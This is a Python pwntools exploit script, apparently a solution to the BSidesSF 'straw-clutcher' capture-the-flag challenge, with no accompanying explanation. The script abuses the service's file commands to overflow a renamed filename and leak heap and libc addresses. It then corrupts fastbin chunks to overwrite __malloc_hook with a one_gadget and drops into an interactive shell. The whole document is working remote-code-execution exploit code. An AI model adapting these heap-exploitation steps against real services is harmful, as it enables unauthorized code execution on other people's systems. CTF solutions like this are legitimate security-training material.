from pwn import *


def main():
    libc = ELF('./libc-2.23.so')
    pc = remote('straw-clutcher-717c5694.challenges.bsidessf.net', 4321)

    pc.sendline('PUT AAA.EXE 10')
    pc.send('A' * 10)

    pc.sendline('RENAME AAA.EXE BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB.EAA')
    pc.sendline('PUT CCC.EXE 128')
    pc.send('C' * 128)
    pc.sendline('PUT DDD.EXE 10')
    pc.send('D' * 10)

    pc.sendline('DELE CCC.EXE')

    pc.sendline('RETR BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB.EAA')
    pc.recvuntil('200 File download started. Prepare to get 16705 bytes')
    data = pc.recvuntil('Data transferred!')
    good_slice = data[100:209]
    
    libc_base = u64(good_slice[-24:-16]) - 0x3c4b78
    __malloc_hook = libc_base + libc.symbols['__malloc_hook']
    __free_hook = libc_base + libc.symbols['__free_hook']
    heap = u64(good_slice[-48:-40])

    log.success('libc base @ ' + hex(libc_base))
    log.success('heap @ ' + hex(heap))
    log.success('__free_hook @ ' + hex(__free_hook))
    log.success('__malloc_hook @ ' + hex(__malloc_hook))

    #################################################
    #################################################

    pc.sendline('PUT EEE.EXE {}'.format(0x48))
    pc.send(p64(0x4848482e484848) + p64(0) * 4 + p64(0x68) + \
        p64(heap + 0x250) + p64(0) + p64(heap + 0x190)) # -0x23

    
    pc.sendline('PUT TTT.TTT {}'.format(0x68))
    pc.send('T' * 0x68)
    pc.sendline('PUT KKK.KKK {}'.format(0x68))
    pc.send('K' * 0x68)
    pc.sendline('DELE TTT.TTT')
    pc.sendline('DELE KKK.KKK')

    pc.sendline('RENAME EEE.EXE ' + 'E' * 7*8 + 'EEEEE.EXP')
    pc.sendline('DELE HHH.HHH')

    pc.sendline('PUT LLL.LLL {}'.format(0x68))
    pc.send(p64(__malloc_hook - 0x13) + 'K' * 0x60)
    pc.sendline('PUT MMM.MMM {}'.format(0x68))
    pc.send('M' * 0x68)
    pc.sendline('PUT NNN.NNN {}'.format(0x68))
    pc.send('N' * 0x68)

    one_gadget = 0x4526a

    pc.sendline('PUT OOO.OOO {}'.format(0x68))
    pc.send('AAA' + p64(libc_base + one_gadget) + 'O' * (0x60-3))

    pc.sendline('PUT JJJ.JJJ 8')

    pc.interactive()


if __name__ == '__main__':
    main()